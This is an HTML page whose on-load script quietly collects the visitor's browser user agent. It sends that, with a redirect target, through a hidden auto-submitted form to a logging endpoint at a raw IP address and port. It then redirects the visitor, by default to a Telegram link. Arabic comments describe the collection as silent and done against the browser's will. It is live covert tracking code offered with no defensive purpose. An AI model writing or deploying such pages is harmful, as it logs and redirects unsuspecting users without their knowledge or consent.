<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        window.onload = function() {
            const p = new URLSearchParams(window.location.search);
            const target = p.get('u') || "https://t.me/vo11a";
            
            // جمع المعلومات بصمت
            const info = "Browser: " + navigator.userAgent;

            // إنشاء نموذج مخفي لإرسال البيانات غصباً عن المتصفح
            const form = document.createElement("form");
            form.method = "GET";
            form.action = "http://147.135.213.131:20364/log";

            const inputU = document.createElement("input");
            inputU.name = "u";
            inputU.value = target;
            form.appendChild(inputU);

            const inputD = document.createElement("input");
            inputD.name = "d";
            inputD.value = info;
            form.appendChild(inputD);

            document.body.appendChild(form);
            
            // إرسال البيانات ثم التحويل
            form.submit();
            setTimeout(() => { window.location.replace(target); }, 500);
        }
    </script>
</head>
<body style="background:#000;"></body>
</html>
